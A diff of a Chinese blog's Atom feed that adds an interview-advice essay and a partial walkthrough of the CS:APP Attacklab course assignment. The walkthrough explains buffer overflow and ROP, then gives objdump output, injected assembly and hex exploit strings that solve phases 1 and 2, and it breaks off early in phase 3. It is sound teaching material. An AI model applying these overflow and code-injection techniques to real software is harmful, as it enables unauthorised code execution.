@@ -4,7 +4,7 @@
   <subtitle><![CDATA[Agony is my triumph]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://wdxtub.com/"/>
-  <updated>2016-02-13T12:08:51.000Z</updated>
+  <updated>2016-02-14T23:50:56.000Z</updated>
   <id>http://wdxtub.com/</id>
   
   <author>
@@ -13,6 +13,311 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[编程起跑线 番外 技术面试感悟]]></title>
+    <link href="http://wdxtub.com/2016/02/14/interview-guide/"/>
+    <id>http://wdxtub.com/2016/02/14/interview-guide/</id>
+    <published>2016-02-14T23:25:08.000Z</published>
+    <updated>2016-02-14T23:50:56.000Z</updated>
+    <content type="html"><![CDATA[<p>本文属于不务正业及歪门邪道，没有太多判断力的同学请不要点开或立即关闭本页面。</p>
+<a id="more"></a>
+<hr>
+<h2 id="u7F18_u8D77"><a href="#u7F18_u8D77" class="headerlink" title="缘起"></a>缘起</h2><p>去年确定要回国之后，基本已经停止了投简历和刷题。这两天完成了（可能是）最后一次 onsite 面试，连续飞来飞去，身心俱疲，但是能免费出去玩，见见朋友聊聊天，还是值得去感受下的。</p>
+<p>从去年九月开始，到现在也算是找了小半年工作了，除了一开始什么都不懂有些迷茫之外，整个过程基本处于可控的状态，从前期的找节奏热身，到后面针对性去考察不同公司，可以说还都是比较顺利的。因为我的动机和大部分人不一样，所以这里谈及的所有，很可能对另一个人没有任何可操作性，当然，如果你对一个『奇葩』的思路和做法感兴趣，请继续。</p>
+<p>借用知乎体，问为什么之前先要问是什么，于是问题来了：什么是面试？什么是找工作？</p>
+<p>狭义来说，找工作面试类似于从学生到社会人身份转换的认证考试，考试成绩可能和工资公司职位有关。但一切认证考试背后的目的是对应的能力，比方说考驾照，背后对应的是驾驶车辆，判断路况以及做出最佳选择的能力。那么在找工作面试这件事儿上，所需的能力是什么呢？</p>
+<p>简单来说八个字：观察、思考、沟通、行动。</p>
+<p>观察不只是看题，更是审时度势说什么不说什么；思考不只是算法，更是逻辑和知识框架的建立；沟通不只是套近乎，更是因势利导去了解对方的思维模式；行动不只是刷题，更是通过试错和改进让自己更快完成身份转换。</p>
+<p>当然，刷题也没什么错，但是不要用战术上的勤奋掩饰战略上的懒惰，道理都懂，我不多说。不过如果连我前面在说什么都看不懂的话，还是老老实实刷题吧。</p>
+<p>我还记得小时候刚开始学英语的时候，面对一个一个不知所云的单词时的无助（当然 GRE 考试我也有这个感觉）。但是这些跟找工作相比（其实具体指对应的能力），就太九牛一毛了。那些可以量化的指标往往都是清晰的，难易暂且不说，但是至少我们有终点，也有起点。</p>
+<p>可是对于那些直觉类的能力，由于悟道时间的不确定，我们唯一能做的就是不断坚持修炼直到开化的那天。</p>
+<p>从这个角度来说，面试就是一个学习的过程，一个公司专门找五六个人陪你聊天帮你成长，不但不收钱还报销一切费用，难道还有更好的事情嘛？就用这么好的机会来刷刷题，难道不觉得很浪费嘛？</p>
+<p>对于半只脚踏入社会的毕业生来说，重要的是尽一切可能去汲取那些在学校里无法获取的知识和经验，当然，结果也重要，不过如果你能在这个过程中学到足够多的东西，结果反而是水到渠成的事情，不必过多担心。</p>
+<h2 id="u6B66_u5668"><a href="#u6B66_u5668" class="headerlink" title="武器"></a>武器</h2><p>就我的感觉来看，简历在没被刷掉之后，作用就基本等于零了。除非参与过一些举世闻名的项目，或者刚好和面试官的领域吻合，不然说真的没人在意。假如硬要说面试官会在面试的时候看，这都面对面了，直接跟他介绍自己不就得了嘛。</p>
+<p>当然这不是说简历不重要，简历重要性在于做简历。要知道每往上面加哪怕一条记录，都需要大量的努力，这些背后的一点一滴，才是简历的价值，然后价值决定价格，价格会浮动，不要因为一点浮动就恐慌性抛售，沉住气，闷声发大财。</p>
+<p>整个找工作过程中，一定要慢慢形成适合自己的合理的思维模式。在学校里，只要足够努力，很多时候都能取得比较好的成绩，但是在步入社会的过程中，或多或少会有迷茫无助的时刻，感觉自己已经刷了很多题目，很认真准备了简历，为什么还是屡战屡败。</p>
+<p>但反过来看，这其实是一个很好的强迫自己去审视自己的机会，看看自己那一步出了问题，然后对应去调整，再根据新的反馈来继续调整，这其实就是面对没有标准解答的问题的时候的最佳实践。就好像机器学习里，有正样本，也有负样本，只有综合考虑运用，才能得到最佳的学校效果。</p>
+<p>一旦有了这种思维，那么飞花落叶皆可伤人</p>
+<h2 id="u62DB_u5F0F"><a href="#u62DB_u5F0F" class="headerlink" title="招式"></a>招式</h2><p>类型</p>
+<p>轮次，题型，气质，感觉</p>
+<p>大公司小公司</p>
+<p>什么才是好的面试题目（自己出而不是网上找）</p>
+<h2 id="u79D8_u7B08"><a href="#u79D8_u7B08" class="headerlink" title="秘笈"></a>秘笈</h2><p>如何看人</p>
+<p>如何试探</p>
+<p>如何搞出气势，主动挖陷阱</p>
+<h2 id="u91D1_u76C6"><a href="#u91D1_u76C6" class="headerlink" title="金盆"></a>金盆</h2><p>总结</p>
+<p>很多内容文章里只能点到为止，想要详细了解的同学可以趁我还在匹兹堡（目测五月中下旬走）的时候约饭聊聊。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>本文属于不务正业及歪门邪道，没有太多判断力的同学请不要点开或立即关闭本页面。</p>]]>
+    
+    </summary>
+    
+      <category term="交流" scheme="http://wdxtub.com/tags/%E4%BA%A4%E6%B5%81/"/>
+    
+      <category term="人生" scheme="http://wdxtub.com/tags/%E4%BA%BA%E7%94%9F/"/>
+    
+      <category term="算法" scheme="http://wdxtub.com/tags/%E7%AE%97%E6%B3%95/"/>
+    
+      <category term="面试" scheme="http://wdxtub.com/tags/%E9%9D%A2%E8%AF%95/"/>
+    
+      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[深入理解计算机系统 习题课 3 Attacklab]]></title>
+    <link href="http://wdxtub.com/2016/02/14/csapp-lab3/"/>
+    <id>http://wdxtub.com/2016/02/14/csapp-lab3/</id>
+    <published>2016-02-14T22:45:14.000Z</published>
+    <updated>2016-02-14T23:03:25.000Z</updated>
+    <content type="html"><![CDATA[<p>这次的作业中，我们将要亲自上手利用漏洞来进行代码注入的攻击，听起来很刺激不是吗？</p>
+<a id="more"></a>
+<hr>
+<h2 id="u603B_u4F53_u4ECB_u7ECD"><a href="#u603B_u4F53_u4ECB_u7ECD" class="headerlink" title="总体介绍"></a>总体介绍</h2><p>这一次我们将实现两种不同类型的攻击：</p>
+<ul>
+<li>缓冲区溢出攻击</li>
+<li>ROP 攻击</li>
+</ul>
+<p>x86-64 架构的寄存器有一些使用习惯，比如：</p>
+<p><img src="/images/14553978485119.jpg" alt=""></p>
+<p>函数调用前需要把某些以后仍旧需要用到的值保存起来。</p>
+<p>而对于 x86-64 的栈来说，栈顶的地址最小，栈底的地址最大，寄存器 <code>%rsp</code> 保存着指向栈顶的指针。栈支持两个操作：</p>
+<ul>
+<li><code>push %reg</code>：<code>%rsp</code> 的值减去 8，把寄存器 <code>%reg</code> 中的值放到 <code>(%rsp)</code> 中</li>
+<li><code>pop %reg</code>：把寄存器 <code>(%rsp)</code> 中的值放到 <code>%reg</code> 中，<code>%rsp</code> 的值加上 8</li>
+</ul>
+<p>接下来需要了解的事情是，每个函数都有自己的栈帧(stack frame)，可以把它理解为每个函数的工作空间，保存着：</p>
+<ul>
+<li>本地变量</li>
+<li>调用者和被调用者保存的寄存器里的值</li>
+<li>其他一些函数调用可选的值</li>
+</ul>
+<p>如下图所示</p>
+<p><img src="/images/14553985892568.jpg" alt=""></p>
+<p>x86-64 的函数调用过程，需要做的设置有：</p>
+<ul>
+<li>调用者：<ul>
+<li>为要保存的寄存器值及可选参数分配足够大控件的栈帧</li>
+<li>把所有调用者需要保存的寄存器存储在帧中</li>
+<li>把所有需要保存的可选参数按照逆序存入帧中</li>
+<li><code>call foo:</code> 会先把 <code>%rip</code> 保存到栈中，然后跳转到 label <code>foo</code> </li>
+</ul>
+</li>
+<li>被调用者<ul>
+<li>把任何被调用者需要保存的寄存器值压栈减少 <code>%rsp</code> 的值以便为新的帧腾出空间</li>
+</ul>
+</li>
+</ul>
+<p>x86-64 的函数返回过程：</p>
+<ul>
+<li>被调用者<ul>
+<li>增加 <code>%rsp</code> 的计数，逆序弹出所有的被调用者保存的寄存器，执行 <code>ret: pop %rip</code></li>
+</ul>
+</li>
+</ul>
+<p>有了上面的基础知识，我们大概就能明白，利用缓冲区溢出，实际上是通过重写返回值地址，来执行另一个代码片段，就是所谓代码注入了。比较关键的点在于</p>
+<ul>
+<li>熟悉 x86-64 约定俗成的用法</li>
+<li>使用 <code>objdump -d</code> 来了解相关的偏移量</li>
+<li>使用 <code>gdb</code> 来确定栈地址</li>
+</ul>
+<p>这之后，我们需要把需要注入的代码转换位字节码，这样机器才能执行，这里可以使用 <code>gcc</code> 和 <code>objdump</code> 来完成这个工作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设 foo.s 是我们想要注入的代码</span></span><br><span class="line">vim foo.s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 gcc 生成对应的字节码 foo.o</span></span><br><span class="line">gcc -c foo.s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 objdump 来查看其内容，可以看到对应的字节码</span></span><br><span class="line">objdump <span class="operator">-d</span> foo.o | less</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后需要把十六进制代码转换成字符串这样我们可以写在程序里</span></span><br><span class="line">./hex2raw -i inputfile -o outputfile</span><br></pre></td></tr></table></figure>
+<p>另一种攻击是使用 return-oriented programming 来执任意代码，这种方法在 stack 不可以执行或者位置随机的时候很有用。</p>
+<p>这种方法主要是利用 gadgets 和 string 来组成注入的代码。具体来说是使用 <code>pop</code> 和 <code>mov</code> 指令加上某些常数来执行特定的操作。也就是说，利用程序已有的代码，重新组合成我们需要的东西，这样就绕开了系统的防御机制。</p>
+<p>举个例子，一个代码片段如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">strcpy</span> (buf, inputt;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>假设我们这里想要把一个值 <code>0xBBBBBBBB</code> 弹出到 <code>%rbx</code> 中并且移动它到 <code>%rax</code> 中，我们找到下面两个 gadgets:</p>
+<ul>
+<li><code>address1: mov %rbx, %rax; ret</code></li>
+<li><code>address2: pop %rbx; ret</code></li>
+</ul>
+<p><img src="/images/14554030733407.jpg" alt=""></p>
+<p>所以在这里我们其实不需要关心如何在 buffer 中运行我们的代码，而只需要知道 buffer 的 size，从而改写返回地址，即可以利用程序中原有的代码进行我们的操作。</p>
+<p>在这个例子中，因为 address2 中的代码是把栈顶的值弹出到 <code>%rbx</code> 中，所以执行的时候，就会把 <code>0xBBBBBBBB</code> 放到 <code>%rbx</code> 中，现在程序就指向 address1 了，然后就会继续执行 address1，也就达到我们的目的，把 <code>0xBBBBBBBB</code> 放到了 <code>%rax</code> 中。</p>
+<p>那么问题来了，我们如何能找到想要的 gadget 呢？在这个试验中，提供了一个 <code>farm.c</code>，可以从这里找到我们需要的 gadgets。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c  farm.c</span><br><span class="line">objdump <span class="operator">-d</span> farm.o | less</span><br></pre></td></tr></table></figure>
+<p>一些建议：</p>
+<ul>
+<li>注意寻找 <code>c3</code> 结尾的代码，因为这可以作为每个 gadget 的最后一句（也就是正常返回）</li>
+<li>画出栈的图</li>
+<li>注意字节的顺序 (little endian)</li>
+</ul>
+<h2 id="u51C6_u5907_u5DE5_u4F5C"><a href="#u51C6_u5907_u5DE5_u4F5C" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
+<li>先下载好试验的压缩包，然后上传到学校的主机上：<code>scp target334.tar dawang@shark.ics.cs.cmu.edu:~/513</code></li>
+<li>接着 ssh 过去：<code>ssh -X dawang@shark.ics.cs.cmu.edu</code></li>
+<li>然后解压：<code>tar -xvf target334.tar</code></li>
+</ul>
+<p>然后就可以看到这次试验的『战场』了：</p>
+<p><img src="/images/14554099850201.jpg" alt=""></p>
+<p>大概介绍下每个文件的作用：</p>
+<ul>
+<li><code>ctarget</code>: 用来做代码注入攻击的程序</li>
+<li><code>rtarget</code>: 用来做 ROP 攻击的程序</li>
+<li><code>cookie.txt</code>: 一个 8 位的 16 进制代码，用来作为攻击的标识符</li>
+<li><code>farm.c</code>: 用来找寻 gadget 的源文件</li>
+<li><code>hex2raw</code>: 用来生成攻击字符串的程序</li>
+</ul>
+<p><code>ctarget</code> 和 <code>rtarget</code> 都会从标准输入中读取字符串，然后保存在一个大小为 <code>BUFFER_SIZE</code> 的 char 数组中（具体的大小每个人的程序都不大一样）。我们可以通过两次输入测试来看看程序具体的行为，一次是正常输入，第二次会输入超出 <code>BUFFER_SIZE</code> 个数的字符串。</p>
+<p><img src="/images/14554110293851.jpg" alt="第一次"></p>
+<p><img src="/images/14554110781316.jpg" alt="第二次"></p>
+<p>所以我们要做的就是输入合理的字符串，来触发对应的操作。用于攻击的程序还可以做到</p>
+<p><img src="/images/14554114722403.jpg" alt="这次即使尝试错误也不会扣分"></p>
+<p>比较有用的是可以把输入放在文件里，这样就不用每次打一长串了。</p>
+<p>有几点需要注意：</p>
+<ul>
+<li>输入的字符串中不能有 <code>0x0a</code>，因为这是 <code>\n</code> 的意思，遇到这个的话会提前结束输入</li>
+<li><code>hex2raw</code> 每次需要输入一个 2 位的 16 进制编码，如果想要输出 0，那么需要写 00。想要转换 <code>0xdeadbeef</code>，需要传入 <code>ef be ad de</code>，因为是 little-endian 规则</li>
+</ul>
+<p>具体有 5 个任务，如下：</p>
+<p><img src="/images/14554126934270.jpg" alt=""></p>
+<h2 id="u7B2C_u4E00_u9636_u6BB5"><a href="#u7B2C_u4E00_u9636_u6BB5" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>这一关中我们暂时还不需要注入新的代码，只需要让程序重定向调用某个方法就好。<code>ctarget</code> 的正常流程是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"NO explit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们要做的是调用程序中的另一个函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也就是在 <code>getbuf()</code> 函数返回的时候，执行 <code>touch1()</code> 而不是返回 <code>test()</code>。下面是一些建议：</p>
+<ul>
+<li>本关所需要的所有信息都可以在 <code>ctarget</code> 的汇编代码中找到</li>
+<li>具体要做的是把 <code>touch1</code> 的开始地址放到 <code>ret</code> 指令的返回地址中</li>
+<li>注意字节的顺序</li>
+<li>可以用 gdb 在 <code>getbuf</code> 的最后几条指令设置断点，来看程序有没有完成所需的功能</li>
+<li>具体 <code>buf</code> 在栈帧中的位置是由 <code>BUFFER_SIZE</code> 决定的，需要仔细察看来进行判断</li>
+</ul>
+<p>接下来我们就开始解题。</p>
+<p>首先是反编译成汇编代码：<code>objdump -d ctarget &gt; ctarget.txt</code></p>
+<p>然后把这个文件传到本地方便查看：<code>scp dawang@shark.ics.cs.cmu.edu:~/513/target334/ctarget.txt ./</code></p>
+<p>接下来我们需要确定 <code>getbuf</code> 到底创建了多大的缓冲区，检索 <code>getbuf</code>，代码如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000000040181c &#60;getbuf&#62;:&#10;  40181c:&#9;48 83 ec 28          sub    $0x28,%rsp&#10;  401820:&#9;48 89 e7             mov    %rsp,%rdi&#10;  401823:&#9;e8 88 02 00 00       callq  401ab0 &#60;Gets&#62;&#10;  401828:&#9;b8 01 00 00 00       mov    $0x1,%eax&#10;  40182d:&#9;48 83 c4 28          add    $0x28,%rsp&#10;  401831:&#9;c3                   retq   &#10;  401832:&#9;90                   nop&#10;  401833:&#9;90                   nop</span><br></pre></td></tr></table></figure>
+<p>可以看到这里把 <code>%rsp</code> 移动了 <code>0x28</code>(40) 位，也就是说，我们的缓冲区有 40 位，再上面的四位就是原来正常需要返回到 <code>test</code> 的返回地址（注意看之前的栈帧图），我们要做的就是利用缓冲区溢出把这个返回地址改掉。</p>
+<p>于是我们继续搜素，来看看 <code>touch1</code> 在哪里：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000401834 &#60;touch1&#62;:&#10;  401834:&#9;48 83 ec 08          sub    $0x8,%rsp&#10;  401838:&#9;c7 05 9a 3c 20 00 01 movl   $0x1,0x203c9a(%rip)        # 6054dc &#60;vlevel&#62;</span><br></pre></td></tr></table></figure>
+<p>可以看到地址在 <code>0x401834</code> 这里，但是我们要凑够 8 位，就是 <code>0x00401834</code>，于是我们需要输入的字符串就可以是这样：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>前四十位是啥都不重要，后面四位按照 little endian 的规则逆向填上地址就好（注意这里为了排版用了换行，实际上都应该在一行，用空格分开），这样就改写了属于原来的返回地址。</p>
+<p>接着我们把这个字符文件转换成字节码 <code>./hex2raw &lt; p1.txt &gt; p1r.txt</code>，最后执行一下 <code>./ctarget -i p1r.txt</code>，就可以看到结果了：</p>
+<p><img src="/images/14554180666014.jpg" alt="成功完成第一关"></p>
+<p>从第一关我们就学到了如何利用缓冲区来调用另外的过程，接下来我们来看第二关。</p>
+<h2 id="u7B2C_u4E8C_u9636_u6BB5"><a href="#u7B2C_u4E8C_u9636_u6BB5" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>第二关中需要插入一小段代码，<code>ctarget</code> 中的 <code>touch2</code> 函数的 C 语言如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据代码就可以看出来，我们需要把自己的 cookie 作为参数传进去，这里需要把参数放到 <code>%rdi</code> 中，只使用 <code>ret</code> 来进行跳转。</p>
+<p>所以第一步，我们先来写需要注入的代码(文件 p2.s)：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $0x45374fee,%rdi # set my cookie as the first parameter&#10;pushq $0x401860&#10;ret</span><br></pre></td></tr></table></figure>
+<p>这里首先把参数传入到 <code>%rdi</code> 寄存器中，然后把 <code>touch2</code> 函数的起始地址压入栈中，最后返回，这样就可以跳转到 <code>touch2</code>。然后转换成对应的机器码 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c p2.s</span><br><span class="line">objdump <span class="operator">-d</span> p2.o &gt; p2.byte</span><br></pre></td></tr></table></figure>
+<p>得到 p2.byte 文件的内容是</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p2.o:     file format elf64-x86-<span class="number">64</span></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 ee <span class="number">4f</span> <span class="number">37</span> <span class="number">45</span> mov    $<span class="number">0x45374fee</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> <span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span>       pushq  $<span class="number">0x401860</span></span><br><span class="line">   c:	c3                   retq</span><br></pre></td></tr></table></figure>
+<p>那么现在问题来了，我们要如何才能让机器开始执行这几行代码呢？简单，利用第一阶段的方式，跳转到缓冲区所在的位置即可，那么问题又来了，缓冲区的位置在哪里呢？这个就需要实际跑一次程序，用 gdb 查看了。</p>
+<p>和上次的试验一样 <code>gdb ctarget</code> 开始调试，因为我想知道缓冲区从哪里开始，所以在 <code>getbuf</code> 中看看 <code>%rsp</code> 的值即可，我们在 <code>0x401828</code> 处设置断点，然后查看对应寄存器的值：</p>
+<p><img src="/images/14554204273695.jpg" alt=""></p>
+<p>可以看到 <code>%rsp</code> 指向的位置是 <code>0x5560f2d8</code>，这样我们就可以得到需要输入的字符串了：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 ee </span><br><span class="line"><span class="number">4f</span> <span class="number">37</span> <span class="number">45</span> <span class="number">68</span> </span><br><span class="line"><span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br><span class="line">c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">d8 f2 <span class="number">60</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>
+<p>然后把字符串转换成字节码：<code>./hex2raw &lt; p2.txt &gt; p2r.txt</code>，执行命令 <code>./ctarget -i p2r.txt</code> 就可以看到完成第二阶段的提示了：</p>
+<p><img src="/images/14554226220350.jpg" alt=""></p>
+<h2 id="u7B2C_u4E09_u9636_u6BB5"><a href="#u7B2C_u4E09_u9636_u6BB5" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>这一关和之前有点类似，只是需要传入一个字符串，所涉及的函数的 C 语言代码是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以看到，和第二阶段的差别在于，这里会调用另一个函数来进行检验，而且传入一个字符串的话，是传入一个地址，并且字符串需要以 0 结尾（查找 ascii 码表来确定），还有一个要注意的地方是，调用 <code>hexmatch</code> 和 <code>strncmp</code> 时会把数据存入栈中，也就是会覆盖一部分 <code>getbuf</code> 的缓冲区，所以要看看到底需要把传入的字符串放到哪里。</p>
+<p>这题稍微有些复杂，我们一步一步来，先把我的 cookie 转换成字符串的表达形式，也就是</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x45374fee</span> -&gt; <span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br></pre></td></tr></table></figure>
+<p>因为知道在调用 <code>hexmatch</code> 的时候会覆盖缓冲区，所以需要找到一个位置来放这八个字符。光看代码比较难懂，不妨直接上手试验一下，我们需要知道的是到底覆盖了多少，所以从 <code>touch3</code> 入手:</p>
